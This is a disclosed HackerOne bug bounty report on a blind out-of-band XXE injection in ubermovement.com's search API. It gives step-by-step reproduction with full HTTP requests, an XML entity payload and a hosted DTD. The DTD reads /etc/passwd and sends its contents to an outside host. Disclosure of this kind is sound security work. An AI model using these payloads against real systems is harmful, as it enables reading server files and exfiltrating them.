# Blind OOB XXE At "http://ubermovement.com/"

## Report Details
- **Report ID**: 154096
- **URL**: https://hackerone.com/reports/154096
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-26T16:12:25.847Z
- **Disclosed**: 2016-08-08T02:35:12.681Z

## Reporter
- **Username**: raghav_bisht
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
Test Summary :
-
POST data was set to <?xml version="1.0" encoding="utf-8"?> <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]> <GeneralSearch>&dtgmlf6ent;</GeneralSearch> 

An HTTP request was initiated for the domain http://122.180.248.81/ which indicates that this script is vulnerable to XXE injection.

NOTE : As it was Blind XXE Test I was Successful in Ping Test for XXE. But unable to retrieve any sensitive information.   

HTTP request details: 
----------------------------
IP address: 8.36.86.67
User agent: Java/1.8.0_60

Vulnerable Domain :
-
http://ubermovement.com/

Vulnerable Link :
-
http://ubermovement.com/api/search/GeneralSearch

Vulnerable Parameter :
-
GeneralSearch

Steps To Reproduce :
-
1. Go to website : http://ubermovement.com/
2. Attach burp Suite & start intercepting now, click on search and search...
3. Grab the GET request
Eg. Original HTTP Request :
-
GET /api/search/GeneralSearch HTTP/1.1
Host: ubermovement.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

4. NOW,

Send request to repeater & change it to POST.

Eg. Original HTTP Request :
-
POST /api/search/GeneralSearch HTTP/1.1
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

5. Now Add content type :
Eg. Content-type: application/xml

Request will be:
-
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 173
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

6. Deploy web server and host "payload.dtd" File eg :
payload.dtd :
-
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>">
%all;


7. Now Add XXE Payload For confirmation :
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [ 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload23.dtd">
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>

Request Will Be :
-
POST /api/search/GeneralSearch HTTP/1.1
Content-type: application/xml
Host: ubermovement.com
Content-Length: 214
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [ 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd">
%dtd;]>
<GeneralSearch>&send;</GeneralSearch>

NOTE : If you view your web server logs you will find a 404 error.

## Attachments
- payload.dtd.png
- dtd.JPG
- Ping_Test_Result.png
- Ping_Test.JPG
- XXE-1.JPG
- xxe--2.png
- xxe-3.png
